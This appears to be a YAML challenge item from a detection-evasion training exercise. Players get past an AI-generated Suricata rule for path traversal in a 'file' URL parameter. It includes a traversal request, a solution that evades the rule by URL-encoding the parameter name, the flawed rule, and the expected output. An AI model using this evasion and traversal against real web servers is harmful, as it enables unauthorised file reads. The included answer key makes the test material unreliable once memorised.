name: 'Path Traversal (Param) (AI)'
type: 'exploit'

text: |-
  Time to bypass the rule(s) below! You're on your own now, but feel free to
  ask questions!

  I generated this rule with the following AI prompt:

  ```
  Can you write a Suricata rule to detect this HTTP-based exploit?

  GET /picture.php?file=../../../../../../../var/www/html/picture.php HTTP/1.1
  Host: localhost
  ```

  (It claimed to use `http.uri.raw` to avoid Suricata normalizing-out the path traversal, but because it's in an argument that never actually happens)

  **Goal: Fetch /var/www/html/picture.php**

hints: []

target: sighting

base_request: |-
  GET /picture.php?file=../../../../../../../var/www/html/picture.php HTTP/1.1
  Host: localhost

solution: |-
  GET /picture.php?%66ile=../../../../../../../var/www/html/picture.php HTTP/1.1
  Host: localhost

solution_note: Uses `http.uri.raw` on the file= portion

rules:
# Lots of problems
  - >
    alert http any any -> any any ( msg:"Directory Traversal in 'file' Parameter (CVE-2021-41773-like)"; flow:established,to_server; http.method; content:"GET"; http.uri; content:"/picture.php"; http.uri.raw; content:"file="; fast_pattern; http.uri.raw; pcre:"/file=[^&]*((\/|%2[fF])\.\.(\/|%2[fF])?)+/i"; classtype:attempted-dir-traversal; sid:1000005; rev:1;)

expected_output: "mime_content_type"
